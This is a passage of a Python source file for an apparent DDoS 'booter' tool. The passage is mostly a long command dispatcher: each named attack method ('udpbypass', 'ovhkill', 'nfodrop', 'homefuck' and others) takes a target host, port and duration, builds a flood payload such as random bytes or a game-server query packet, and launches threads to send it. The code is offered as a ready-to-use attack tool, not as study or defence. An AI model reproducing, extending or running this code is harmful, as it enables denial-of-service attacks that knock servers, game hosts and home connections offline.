				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-ack":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpv3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhshit":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homefuck":
			try:
				sinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				size = "1024"
				bytes = random._urandom(int(size))
				threading.Thread(target=homeudp, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeicmp, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeudpivp6, args=(host, port, timer, bytes)).start()
				threading.Thread(target=homeicmpivp6, args=(host, port, timer, bytes)).start()
				print("\n     \033[97m  Your Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-get":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("     Attack Sent To: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("     {} Requires An Argument.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("     Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "onhold":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=onholdsender, args=(host, port, timer, punch)).start()
					print("\n     \033[97mYour Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homekill":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x0e\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mYour Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homenull":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x0d\x31\x32\x33\x34\x35\x36\x37\x38\x51\x39\x39\x39\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\n     \033[97mK Your Attack Has Been Launched!\n")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "homebypass":
			try:
					sinput, host, port, timer = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, pack)).start()
					threading.Thread(target=synsender, args=(host, port, timer, punch)).start()
					print("\n     \033[97mYour Attack Has Been Launched!\n")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			os.system("cls" or "clear")
			print (help)
			print ("Mày bị ngu àaa")
			main()


try:
	clear = "cls" or "clear"
	os.system(clear)
	print(banner, end= '', flush= True)
	main()
except KeyboardInterrupt:
	exit()
